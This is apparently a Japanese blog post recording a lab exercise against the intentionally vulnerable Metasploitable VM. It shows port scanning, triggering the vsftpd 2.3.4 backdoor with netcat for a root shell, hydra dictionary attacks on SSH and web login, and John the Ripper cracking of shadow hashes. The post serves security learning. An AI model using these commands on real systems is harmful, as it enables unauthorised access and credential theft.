---
title: Metasplotableで体験するLinuxのハッキング
date: 2020-02-27T00:24:00.000Z
description: Metasplotableで体験するLinuxのハッキング
tags: ['セキュリティ', 'Linux']
---

Metasploitableという脆弱性が用意されたLinuxの仮想環境に対して攻撃を試すことで、Linuxのハッキング方法について学んだので、実際に試した攻撃についてまとめています。

## 注意

この記事は攻撃方法を知ることでセキュリティを学ぶことを前提としており、実験も仮想環境上で実行しています。  
決して外部の環境に対して実行しないようにしてください。

## 参考

[ハッキング・ラボのつくりかた 仮想環境におけるハッカー体験学習](https://www.shoeisha.co.jp/book/detail/9784798155302)  
第5章 「Metasploitableのハッキング」

## ツール一覧

* Netcat
    * TCP/UDPの接続を利用したデータを送受信するCLIツール
    * ファイル転送など色々な用途に使える万能ツール
* nmap
    * 攻撃対象の空いているポート番号を特定する（ポートスキャン）
* [Explit-DB](https://www.exploit-db.com/)、[CVE Details](https://www.cvedetails.com/)
    * 脆弱性を検索できるサービス
* hydra
    * オンラインのパスワードクラッキングツール
* Jhon the Ripper
    * 暗号化されたパスワードの解析ツール
    * Linuxの /etc/shadow やWebサービスのDBに保存してある暗号化されたパスワードを解析して元の文字列を復元する
* wireshark
    * パケットキャプチャツール
    * ネットワーク内のパケットをキャプチャすることで、どこ対してどんな内容の通信がされているかを解析する。

## ポートスキャン

-p-: 1~65535番までのポート番号を対象とする  
-sV: 各ポートのサービスのバージョンを検出する  
-O: ターゲットのOSを特定する。  

```
$ nmap -sV -O -p- <IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-27 00:28 JST
Nmap scan report for 10.0.0.5
Host is up (0.00068s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
...
```

## vsftpdのバックドアを利用

vsftpd 2.3.4 には リモートからコマンド実行可能なバックドアが含まれている。
（2011/06/30に埋め込まれて、2011/07/03 には修正済み）  
`:)` を含むユーザー名でFTPにログインするとポート6200(TCP)にバックドアが開く。

```
$ nc <攻撃対象のIP> 21
220 (vsFTPd 2.3.4)
USER hoge:)
331 Please specify the password.
PASS hoge
```

別ターミナルで確認すると6200ポートが開いてる事が確認できる。

```
$ nmap -p 6200 <IP>
PORT     STATE SERVICE
6200/tcp open  lm-x
```

6200ポートにバックドアが開くので、別ターミナルで6200にアクセスする。

```
$ nc -nv <IP> 6200
(UNKOWN) [<IP>] 6200 (?) open
whoami # コマンドを実行
root   # 結果が返ってくる
```

## 辞書攻撃でSSHアカウントの認証解析

```
# ユーザーの辞書ファイルを作成
$ cat > user.lst
root
sys
...

# パスワードの辞書ファイルを作成
$ cat > pass.lst
root
passwd
...

# 辞書ファイルを利用して総当たり
$ hydra -L user.lst -P pass.lst -t 4 <IP> ssh
```

## 暗号化パスワードの解析

John the Ripper を利用してパスワードを解析する。  
`ユーザー名:暗号化パスワード` の形式で解析したいパスワードをファイルに保存してコマンドを実行

```
$ cat passwords
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::

# 総当たり攻撃で解析（めっちゃ時間かかる）
$ john --incremental passwords
```

## HTTPの認証を解析

hydra で認証ページに対して辞書攻撃をして有効なID/パスワードを見つける。  
http-form-post の書式は `<認証APIのパス>:<送信パラメータ>:<認証失敗時のレスポンスに表示される文字列>`となる。
攻撃対象のURLや送信パラメータの構造は wireshark などでパケットキャプチャをして確認する。  

```
$ hydra -L user.lst -P pass.lst -s <Webサービスのポート> <ターゲットIP> http-form-post "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
```

